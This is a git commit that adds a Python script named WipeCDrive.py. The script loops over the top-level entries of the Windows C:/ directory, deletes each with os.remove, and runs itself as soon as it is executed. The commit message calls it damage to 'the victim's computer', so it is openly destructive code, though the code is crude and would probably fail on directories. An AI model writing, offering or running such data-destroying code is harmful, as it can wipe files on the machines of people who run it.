5b6c60be9ae2b4b9db81a01034c51209f9d25b90
w01verine <56714639+w01verine@users.noreply.github.com>
2023-06-11 02:53:05 -0400

    Create WipeCDrive.py
    This can cause serious damage to the victim's computer, as it can delete important system files and render the system inoperable. It's important to note that this code should never be run.

---
+++ WipeCDrive.py
@@ -0,0 +1,18 @@
+# Created By: Tommie Navitskas 2023
+
+# WARNING! RUNNING THIS PROGRAM WILL CAUSE SERIOUS DAMAGE TO A WINDOWS COMPUTER
+
+import os
+
+# This program will delete all files in the C:/ directory
+def delete_files():
+    try:
+        directory = 'C:/'
+        for filename in os.listdir(directory):
+            file_path = os.path.join(directory, filename)
+            os.remove(file_path)
+        print('All files in C:/ directory have been deleted.')
+    except Exception as e:
+        print('Error:', e)
+
+delete_files()
